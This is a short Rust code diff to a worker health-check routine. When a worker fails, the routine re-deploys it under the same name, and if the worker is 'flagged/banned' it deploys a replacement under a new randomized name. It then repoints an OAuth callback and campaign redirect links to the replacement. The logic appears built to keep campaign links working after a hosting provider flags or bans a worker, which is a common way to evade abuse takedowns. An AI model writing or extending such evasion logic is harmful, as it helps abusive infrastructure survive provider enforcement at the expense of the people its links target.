@@ -259,6 +259,30 @@ pub async fn run_worker_health_check(state: &AppState) {
     if new_failures >= 3 {
         eprintln!("[worker-health] Auto-deploying replacement worker...");
 
+        // Step 1: Try re-deploying to the SAME worker name first.
+        // This fixes "down/crashed" workers while keeping old links alive
+        // (the worker URL doesn't change, so existing links still work).
+        eprintln!("[worker-health] Attempting same-name re-deploy: {}", worker_name);
+        match deploy_new_worker(state, &worker_name, &workers_subdomain).await {
+            Ok(same_url) => {
+                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+                if check_worker_health(&same_url).await {
+                    eprintln!("[worker-health] Same-name re-deploy succeeded: {}", worker_name);
+                    let redirect_uri = format!("{}/oauth/callback", same_url);
+                    update_active_worker(&state.pool, &worker_name, &workers_subdomain, &same_url, &redirect_uri, "healthy").await;
+                    return;
+                }
+                eprintln!("[worker-health] Same-name re-deployed but health check failed. Trying new name.");
+            }
+            Err(e) => {
+                eprintln!("[worker-health] Same-name re-deploy failed: {}. Trying new name.", e);
+            }
+        }
+
+        // Step 2: If same-name failed (worker is flagged/banned), deploy
+        // with a new randomized name. Old links to the dead worker will
+        // fail, but new links using /api/campaigns/redirect will work
+        // automatically because that endpoint reads from the DB.
         let new_name = generate_worker_name();
         match deploy_new_worker(state, &new_name, &workers_subdomain).await {
             Ok(new_worker_url) => {
